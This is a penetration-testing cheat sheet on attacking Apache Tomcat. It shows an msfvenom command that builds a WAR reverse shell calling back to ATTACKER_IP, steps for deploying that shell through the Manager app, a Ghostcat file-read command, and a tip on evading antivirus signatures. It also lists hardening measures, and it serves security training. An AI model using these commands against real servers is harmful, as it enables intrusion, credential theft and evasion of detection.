
# Apache Tomcat - Java Web Server Exploitation

## 🧠 Overview

Apache Tomcat is an open-source implementation of the Jakarta Servlet and Expression Language technologies. In internal environments, it is often found running with high privileges, hosting critical business logic.

➡️ **Key Concept:** Tomcat uses **WAR (Web Application Resource)** files to deploy applications. If an attacker can upload a malicious WAR file, they gain **Remote Code Execution (RCE)** through the Java runtime.

---

## 🔍 Discovery & Footprinting

### 🧪 Identifying Tomcat

* **Default Ports:** `8080` (HTTP), `8443` (HTTPS), and `8009` (AJP).
* **Error Pages:** Requesting a non-existent page often reveals the specific version in the footer.
* **Directory Structure:**
* `/manager/html`: The GUI for application management.
* `/host-manager/html`: Managing virtual hosts.
* `/webapps/`: Where applications are stored.



---

## 💥 Authenticated RCE: The WAR Upload

If you obtain credentials (via brute force or finding them in `tomcat-users.xml`), the path to a shell is through the **Manager App**.

### 🚀 Step 1: Crafting the Malicious WAR

You can manually zip a JSP shell or use `msfvenom` for a more stable reverse shell.

```bash
# Method A: Manual JSP Zip
zip -r reverse_shell.war cmd.jsp

# Method B: MSFVenom (Recommended)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4443 -f war > exploit.war

```

### 🚀 Step 2: Deployment

1. Navigate to `http://TARGET:8080/manager/html`.
2. Find the **"War file to deploy"** section.
3. Upload `exploit.war` and click **Deploy**.
4. Trigger the shell by visiting `http://TARGET:8080/exploit/`.

---

## 🔥 Critical Vulnerability: Ghostcat (CVE-2020-1938)

**Ghostcat** is a critical LFI (Local File Inclusion) vulnerability in the **AJP (Apache JServ Protocol)**. It allows an unauthenticated attacker to read arbitrary files from the web application directory (including `WEB-INF/web.xml`).

### 🧩 The AJP Protocol

AJP is a binary version of HTTP, typically used when Tomcat is behind an Apache web server. It listens on port **8009**.

### 🚀 Exploiting Ghostcat

If port 8009 is open, you can exfiltrate sensitive configuration files that might contain database credentials or internal logic.

```bash
# Reading the web.xml file using a PoC script
python2.7 ghostcat.py TARGET_IP -p 8009 -f WEB-INF/web.xml

```

---

## 🛠️ Summary of Attack Vectors

| Vector | Requirement | Impact |
| --- | --- | --- |
| **Manager Brute Force** | Port 8080 + Weak Creds | **Critical** (Full RCE) |
| **Ghostcat (LFI)** | Port 8009 (AJP) | **High** (Sensitive File Read) |
| **CGI Injection** | CVE-2019-0232 | **Critical** (Windows RCE) |
| **Unprotected Examples** | `/examples/` servlet | **Low/Medium** (Info Leak) |

---

## 🛡️ Defensive Measures

1. **Hardened Credentials:** Change default passwords for `admin` and `tomcat` users.
2. **Restrict Manager Access:** Use the `RemoteAddrValve` in `context.xml` to allow only specific IP addresses to access `/manager`.
3. **Disable AJP:** If you don't need a reverse proxy, comment out the `<Connector port="8009" protocol="AJP/1.3" ... />` line in `server.xml`.
4. **Least Privilege:** Run Tomcat as a dedicated, low-privileged user (e.g., `tomcat`), never as `root` or `SYSTEM`.

---

## 💣 Pentester Mindset

* **The "Clean-Up":** Always remember to **Undeploy** your WAR files after a test to avoid leaving backdoors on the client's infrastructure.
* **Scan for `tomcat-users.xml`:** If you find another vulnerability (like LFI) in a different app on the same server, your first target should be `/etc/tomcatX/tomcat-users.xml` to get the manager credentials.
* **Evasion:** As you noted, small changes in the JSP shell output strings (like `uPlOaDeD`) can help bypass basic string-based EDR/AV signatures.
